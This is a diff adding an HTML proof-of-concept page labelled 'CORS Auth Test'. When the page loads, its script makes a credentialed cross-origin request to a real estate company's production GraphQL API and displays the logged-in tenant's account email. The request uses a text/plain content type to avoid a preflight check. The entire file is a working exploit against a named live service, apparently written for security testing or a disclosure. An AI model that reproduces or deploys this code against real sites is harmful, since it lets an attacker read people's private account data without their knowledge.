@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>CORS Auth Test</h1>
+    <pre id="log"></pre>
+    <script>
+        const log = (m) => document.getElementById('log').innerText += m + '\n';
+        
+        async function runPoc() {
+            log("Starting request...");
+            try {
+                const r = await fetch("https://tenant-experience-api.realestate.com.au/graphql", {
+                    method: "POST",
+                    credentials: "include",
+                    headers: {
+                        "Content-Type": "text/plain",
+                        "x-locke-id": "cfb83558-c729-5763-96ed-e5d20f4cf107"
+                    },
+                    body: JSON.stringify({
+                        query: "query { tenantProfile { accountDetails { email } } }"
+                    })
+                });
+                const d = await r.json();
+                log("Response: " + JSON.stringify(d, null, 2));
+            } catch (e) {
+                log("Error: " + e.message);
+            }
+        }
+        runPoc();
+    </script>
+</body>
+</html>
